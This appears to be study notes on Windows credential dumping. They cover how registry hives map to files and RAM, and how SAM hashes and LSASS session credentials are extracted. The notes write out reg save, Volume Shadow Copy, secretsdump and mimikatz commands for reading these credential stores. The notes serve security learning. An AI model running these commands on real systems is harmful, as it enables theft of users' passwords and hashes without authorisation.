## Registry — Disk AND RAM

Registry hives are stored as physical files on disk:

```
HKLM\SYSTEM        → C:\Windows\System32\config\SYSTEM
HKLM\SOFTWARE      → C:\Windows\System32\config\SOFTWARE
HKLM\SAM           → C:\Windows\System32\config\SAM
HKLM\SECURITY      → C:\Windows\System32\config\SECURITY
HKCU               → C:\Users\username\NTUSER.DAT
```

*Binary* files — not human readable.

At boot, Windows **loads hives into RAM**. `regedit` reads the in-memory copy. Changes go to RAM first, then flush to disk.

```
Disk (hive files) → loaded at boot → RAM (live registry) → regedit reads from here
```

---
## Dumping Credentials — SAM vs LSASS

### SAM — NTLM hashes of ALL local accounts (even logged off)

SAM on disk is **locked while Windows runs** — two ways around it:

#### **Method 1 — Registry export (in-memory hive) | <u>needs SYSTEM</u>**

`reg save` exports the live in-memory hive to disk. SAM hashes are encrypted with SYSKEY so you always need **both** SAM + SYSTEM hive to decrypt.

``` cmd
reg save HKLM\SAM C:\temp\sam.bak
reg save HKLM\SYSTEM C:\temp\system.bak
````

Decrypt **offline**:

```bash
impacket-secretsdump -sam C:\temp\sam.bak -system C:\temp\system.bak LOCAL
```

Or via **mimikatz**:

```
mimikatz → lsadump::sam
```

#### **Method 2 — Volume Shadow Copy Service (VSS)**

VSS snapshots are point-in-time disk copies — the file lock doesn't apply to them, so you can copy SAM directly.

```cmd
# List available snapshots
vssadmin list shadows

# Copy SAM and SYSTEM from snapshot
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM C:\temp\sam.bak

copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\temp\system.bak
```

Then same offline decryption with secretsdump:

```
# After copying from VSS you now have the files locally: 
C:\temp\sam.bak 
C:\temp\system.bak 

# Run secretsdump the same way: 

impacket-secretsdump -sam C:\temp\sam.bak -system C:\temp\system.bak LOCAL
```

**LOCAL** at the end tells secretsdump you're working with **offline files** — not connecting to a live machine. It decrypts SAM using the SYSKEY extracted from the SYSTEM file and outputs the hashes.

---
### LSASS — Credentials of CURRENTLY logged-in users only

LSASS is a Windows process that caches active session credentials **directly in process memory** — completely separate from the registry.

```cmd
mimikatz → sekurlsa::logonpasswords
```

Gives plaintext passwords (if WDigest enabled) + NTLM hashes of active sessions.

---
### Summary

|**Feature**|**SAM (Security Accounts Manager)**|**LSASS (Local Security Authority)**|
|---|---|---|
|**Accounts**|**All** local accounts on the machine.|**Currently logged-in** sessions only.|
|**Location**|Registry hive / Disk (`%SystemRoot%\system32\config\SAM`)|Process memory (`lsass.exe`)|
|**Output**|NTLM hashes only.|Plaintext passwords (if WDigest/SSP enabled) + NTLM hashes.|
|**Requires**|`SYSTEM` privileges to read the hive.|`SYSTEM` or `SeDebugPrivilege` to dump memory.

---
---
